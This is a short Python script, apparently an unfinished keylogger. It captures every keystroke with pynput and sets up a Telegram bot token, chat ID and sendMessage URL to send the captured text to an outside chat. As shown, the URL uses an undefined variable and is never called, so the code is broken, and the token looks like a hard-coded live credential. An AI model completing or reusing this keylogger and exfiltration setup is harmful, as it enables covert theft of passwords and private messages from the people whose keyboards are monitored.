from pynput import keyboard

TOKEN = "8543293257:AAE6cE2syuPHrjzuJPsAF53V67hEPpCKEJk"
CHAT_ID = "1070689396"

url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={MESSAGE}"

real_word = ''

def on_press(key):
    try:
        print(f"Key pressed: {key.char}")
    except AttributeError:
        print(f"Special key: {key}")

def on_release(key):
    if key == keyboard.Key.esc:
        print("Stopping...")
        return False

with keyboard.Listener(
    on_press=on_press,
    on_release=on_release
) as listener:
    listener.join()